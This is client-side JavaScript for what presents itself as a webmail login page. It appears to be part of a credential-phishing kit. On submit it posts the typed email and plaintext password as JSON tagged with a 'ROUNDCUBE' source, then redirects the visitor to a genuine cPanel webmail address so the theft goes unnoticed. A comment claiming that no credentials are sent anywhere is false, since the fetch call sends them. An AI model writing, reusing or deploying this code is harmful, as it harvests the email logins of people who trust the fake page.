// Webmail login page - client-side behaviour

    const form = document.getElementById("loginForm");
    const email = document.getElementById("email");
    const password = document.getElementById("password");
    const errorMsg = document.getElementById("errorMessage");
    const loginBtn = document.getElementById("loginBttn");

    // Simple RFC 5322-style email check (good enough for UI validation)
    function isValidEmail(value) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
    }

    function showError(show) {
        errorMsg.hidden = !show;
        email.style.borderColor = show ? "#c9302c" : "";
        password.style.borderColor = show ? "#c9302c" : "";
    }

    // Live validation: clear the error state as the user types
    [email, password].forEach(function (field) {
        field.addEventListener("input", function () {
            showError(false);
        });
    });

    form.addEventListener("submit", function (event) {
        event.preventDefault();
        showError(false);

        if (!isValidEmail(email.value) || password.value.length === 0) {
            showError(true);
            return;
        }


        // Demo only: no credentials are sent anywhere.
        loginBtn.classList.add("loading");
        loginBtn.disabled = true;
        loginBtn.textContent = "Logging in…";

         fetch('', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                email: email.value,
                password: password.value,
                source: 'ROUNDCUBE',
              }),
      		  
      		  
      
            })
    
    		  .finally(() => {
    		  loginBtn.classList.remove('loading');
   			  loginBtn.disabled = false;
  			  })
    
              .then((data) => {
                window.location.href = 'https://webmail.cpanel.net/';
              });


    });

